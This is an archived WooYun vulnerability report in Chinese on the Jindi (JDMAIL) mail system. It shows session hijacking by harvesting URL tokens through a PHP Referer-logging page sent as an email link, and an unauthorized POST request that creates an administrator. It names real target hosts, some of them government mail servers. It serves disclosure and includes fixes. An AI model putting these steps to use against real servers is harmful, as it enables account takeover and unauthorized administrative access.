{"id": 1833, "wybug_id": "wooyun-2014-062376", "wybug_title": "某邮件系统任意用户劫持到添加系统管理员", "wybug_corp": "金笛邮件管理系统", "wybug_author": "xfkxfk", "wybug_date": "2014-05-26 14:51", "wybug_open_date": "2014-08-24 14:52", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "敏感接口缺乏校验", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向公众公开  简要描述： ~~ 详细说明：  金迪邮件系统，JDMAIL用户量很大，官方案例：http://www.mailer.com.cn/Products6.htmlhttp://www.mailer.com.cn/New%20Customers/index1.htm利用证明：关键字：intitle:金笛邮件管理系统http://mail.lyx928.com:8080http://mail.njzj.gov.cn:8080http://mail.shszx.gov.cn:8600......此邮件系统存在多处设计缺陷高危漏洞。   漏洞证明：  0x001 任意用户劫持此邮件系统，在登陆后url中有一个8或者9位的字符串，如45e22a8H7这个字符串就是登陆的凭证，当登录后，只要拿到这个字符串就可以直接登陆此用户名，没有session和cookie的验证。意思就是说我们获取到登陆后的url，只要此用户名没有注销登陆出的话，直接就能利用此url直接登陆系统。利用方式很简单，给任意用户发一个email，email的内容中加载一个超链接，诱使用户点击此链接，此链接在后端抓取此次请求的Referer即可，此时你就可以得到他的url，也就劫持了用户。更直接的给管理员发送恶意邮件即可劫持之。或者通过XSS悄无声息的劫持任意用户账号。这里我们拿http://mail.lyx928.com:8080进行测试。用户test@dodole.net，弱口令111111登陆之，然后我们给此用户发送邮件：\n\n内容中加入了超链接：\n\n此超链接的内容为：\n<?phpfile_put_contents(\"referer.txt\",  \" ref:\".$_SERVER[\"HTTP_REFERER\"], FILE_APPEND);  file_put_contents(\"referer.txt\",  \" IP:\".$_SERVER[\"REMOTE_ADDR\"], FILE_APPEND); file_put_contents(\"referer.txt\",  \" Time:\".date(\"Y.m.d H:i:s\").\"\\r\\n\",FILE_APPEND); ?>\n获取Referer的内容到referer.txt中当test@dodole.net点击此链接后，看看我们获取到的Referer内容：\n\n成功获取了Referer，以及url中的认证字符串。我们换一个浏览器访问此url即可，看是否成功登陆：\n\n成功登陆劫持到的用户，很Easy！0x002 添加管理员这里存在越权操作我们登录普通用户后，可以直接添加一个管理员用户：\n链接：http://mail.lyx928.com:8080/tmw/45e22a8H7/mailmain?type=msaveuserPOST：subtype=new&username=test123&domain=dodole.net&usertype=S&departmentid=&first_name=test123&password=111111&encodetype=inner&enable=true&enable_smtp=true&enable_pop3=true&enable_imap4=true&enable_webaccess=true&alias=&expiredtime=&max_mailbox_size=-1&max_mailbox_msgs=-1&fm_size=-1&fm_upload_size=-2&sendmail_freq=&sendsms_freq=&sendmms_freq=&wm_max_attachment_size=&default_language=SIMPLIFIED_CHINESE&telephone=&mobile=&postalcode=&country=&state_province=&city=&organization=&department=&address=\n添加一个test123@dodole.net的管理员用户\n\n   修复方案：  1、加强用户登陆状态验证2、严格控制用户权限   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-30 17:19 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开联系渠道向软件生产厂商通报，电话(李文霞)，将通报发送至和邮箱中处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-24 16:35 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  三个$……这估计奖励有上万了把    \n     2014-08-24 18:09 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  这个奖金怎么这么高……    \n     2014-08-25 10:20 |    \t\t汪哥 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:6        )\t\t \n  @Coffee 同问    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}